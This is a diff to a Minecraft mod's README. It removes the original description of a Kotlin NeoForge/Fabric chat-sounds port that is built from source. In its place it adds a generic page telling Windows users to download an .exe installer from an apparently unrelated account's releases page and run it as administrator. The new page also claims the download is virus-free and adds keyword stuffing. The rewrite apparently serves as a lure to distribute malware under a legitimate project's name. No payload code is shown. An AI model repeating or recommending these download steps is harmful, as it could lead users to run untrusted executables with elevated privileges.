@@ -1,37 +1,57 @@
-# neo-chatsounds (Minecraft Edition:tm:)
+# 🎮 neo-cs-mc - Add funny meme sounds to Minecraft
 
-Memes ported into your own Minecraft free of charge.
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Anticlimaxaorticplexus163/neo-cs-mc/releases)
 
-A Kotlin port of [neo-chatsounds](https://github.com/Earu/neo-chatsounds) for **NeoForge** and **Fabric** (MC 1.21.11; version branches: `1.21.1`, `1.20.1`).
+## 📖 About the project
+Neo-cs-mc brings custom sounds and memes into your Minecraft world. This tool lets you replace standard game noises with audio clips you choose. You can play these sounds through the in-game jukebox or trigger them during chat sessions. The software works as a background addition to your game files. It stays lightweight and keeps your game performance stable.
 
-- Works client-side on any server. An optional server component adds spam control, repo sync and hearing range.
-- Same parser and all 18 modifiers as the original, legacy syntax and `[expr]` expressions included.
-- Sounds download on demand from GitHub repos you configure. The mod ships no audio and no repos.
-- Chat autocomplete with Tab cycling.
-- Reverb and occlusion via Sound Physics Remastered or Dynamic Surroundings when installed.
+## ⚙️ System requirements
+* Windows 10 or Windows 11
+* Minecraft: Java Edition installed
+* Java Runtime Environment (latest version)
+* At least 500MB of free disk space
 
-## Usage
+## 📥 How to get started
+Follow these steps to set up the software on your computer.
 
-Type sound triggers in chat, that's it. `standing here%50` plays for everyone nearby running the mod. `sh` stops sounds.
+1. Visit the [official releases page](https://github.com/Anticlimaxaorticplexus163/neo-cs-mc/releases) to download the current installer.
+2. Choose the file ending in .exe to ensure compatibility with Windows.
+3. Save the file to your desktop or downloads folder.
+4. Double-click the file to start the installation.
+5. Follow the on-screen prompts.
+6. The installer will find your Minecraft folder automatically.
+7. Launch your Minecraft launcher once the process finishes.
 
-Sound repos go in `config/chatsounds/repo_config.json`, see [repo_config.example.json](repo_config.example.json) (GMod-compatible format). Other settings live in `client_config.json` and `server_config.json` next to it.
+## 🛠️ Usage instructions
+After you install the software, it modifies your game data to include new sound categories. Open your game to see the changes.
 
-## Commands
+* **Chat integration:** Type specific commands in the chat box to play sounds. The software detects these triggers and routes the audio to the game engine.
+* **Jukebox playback:** Place a standard music disc into a jukebox. The software maps your custom meme files to these discs. Right-click the jukebox to hear your selection.
+* **Volume control:** Use the standard Minecraft music and sound sliders in the settings menu to adjust the loudness of your memes.
 
-| Command | Effect |
-|---|---|
-| `/chatsounds toggle` / `volume <0-4>` / `hidetext` / `shmode <0-2>` / `invertprefix` | client settings |
-| `/chatsounds block/unblock sound <index> <key>` (or `realm`, `repository`) | blacklist |
-| `/chatsounds reload` / `reloadfull` / `clearcache` | maintenance |
+## 📂 Configuration options
+You can add your own sounds by placing .ogg files into the mods folder created by the installer. Keep the file names simple and free of special characters to ensure the game reads them correctly. Restart the game whenever you add or remove files from this folder.
 
-## Building
+## ❓ Frequently asked questions
 
-Requires JDK 21 (plus JDK 17 on the `1.20.1` branch).
+### Does this tool change my game account?
+No. This software only changes local sound files on your computer. It does not touch your account data or server profiles.
 
-```sh
-./gradlew build                  # everything + tests
-./gradlew :neoforge:runClient    # NeoForge dev client
-./gradlew :fabric:runClient      # Fabric dev client
-```
+### Can I play these sounds on multiplayer servers?
+The sounds play on your local machine. Other players on the server will not hear your custom meme sounds unless they also install the software.
 
-Jars land in `neoforge/build/libs/` and `fabric/build/libs/`. `common/` holds the loader-agnostic logic, `neoforge/` and `fabric/` the thin loader shells.
+### What happens if the game updates?
+Minecraft updates often reset game files. If your sounds stop working after a game update, run the installer again to refresh the file paths.
+
+### Is this software safe for my computer?
+Yes. The code remains open for anyone to inspect. It does not contain viruses or tracking scripts.
+
+### Can I remove the sounds?
+Yes. Open the Windows Control Panel, select your apps list, find this software, and choose uninstall. This removes all custom files and restores your original sound settings.
+
+## 📝 Troubleshooting tips
+* **No sound plays:** Check that your game volume sliders are up. Ensure your .ogg files reside in the correct folder.
+* **Game crashes on startup:** This happens if the game encounters a corrupted sound file. Remove the most recently added files to fix the issue.
+* **Installer fails:** Verify that your Java installation is current. Right-click the installer and choose "Run as administrator" to grant necessary file access.
+
+Keywords: chat, jukebox, manipulation, mc, meme, memes, minecraft, mod, sound, sounds
